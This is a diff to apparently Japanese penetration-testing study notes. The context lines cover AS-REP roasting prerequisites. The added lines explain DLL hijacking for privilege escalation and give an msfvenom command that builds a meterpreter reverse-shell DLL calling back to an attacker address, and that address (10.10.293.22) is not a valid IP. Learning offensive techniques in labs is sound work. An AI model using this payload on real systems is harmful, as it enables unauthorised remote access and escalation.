@@ -16,3 +16,13 @@ Kerberosへの認証において、まずはAS-REQを送信するというステ
 - AS-REQを送る際になりすますドメインの、有効なユーザ名が分かっている
 - Kerberosのポート(88番)と通信できる
 - DC側の設定で、ターゲットユーザアカウントのKerberos pre authenticationが有効になっていない
+
+
+## DLL Hijacking
+.exeバイナリやそのバイナリに紐づいたサービスは、起動時にDLLを探す。  
+**これらのDLLが存在しないかDLLが絶対パスを使わずに呼び出されるといったケースで、バイナリやサービスに悪意のあるDLLファイルを強制的にロード&実行させて権限昇格することができる。**  
+  
+msfvenom等でバイナリを生成し、DLLやバイナリを生成してリバースシェルを実行すると権限昇格に成功するなどできる。  
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.293.22 LPORT=4444 -f dll -o hoge.dll
+```
